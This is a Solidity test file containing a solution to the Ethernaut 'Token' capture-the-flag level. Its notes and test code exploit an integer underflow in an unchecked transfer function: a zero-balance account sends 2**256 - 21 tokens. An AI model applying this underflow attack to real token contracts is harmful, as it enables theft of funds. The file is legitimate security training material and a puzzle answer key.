// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Token/TokenFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

/*
    Solution notes:
    - Because the contract version changed to 0.8.10, they had to add `unchecked` which
    is a bit of a giveaway that over/underflow is involved
    - The "odometer" hint probably means that once an odomoter reachs it's max value, eg. 9999
    it will tick over to 0000.
    - the require `>= 0` allows an account with a balance of 0 to transfer funds, and the lack of underflow
    check doesnt prevent the transfer from happening

*/

contract TokenHack is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testTokenHack() public {
        // ========================= LEVEL SETUP
        // fund the EOA
        vm.deal(eoaAddress, 5 ether);

        // create the factory
        TokenFactory tokenFactory = new TokenFactory();

        // register the level
        ethernaut.registerLevel(tokenFactory);

        // start pranking the user
        vm.startPrank(eoaAddress);
        // instantiate the level
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernaughtToken = Token(payable(levelAddress));
        vm.stopPrank();

        // =========================  ATTACK
        address otherUser = address(5);
        vm.startPrank(otherUser);
        // we had 20 tokens to start with, so subtract 21 to prevent overflow
        ethernaughtToken.transfer(eoaAddress, 2**256 - 21);
        vm.stopPrank();
        emit log_named_uint(
            "balance: :",
            ethernaughtToken.balanceOf(eoaAddress)
        );

        // ========================= SUBMISSION

        vm.startPrank(eoaAddress);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
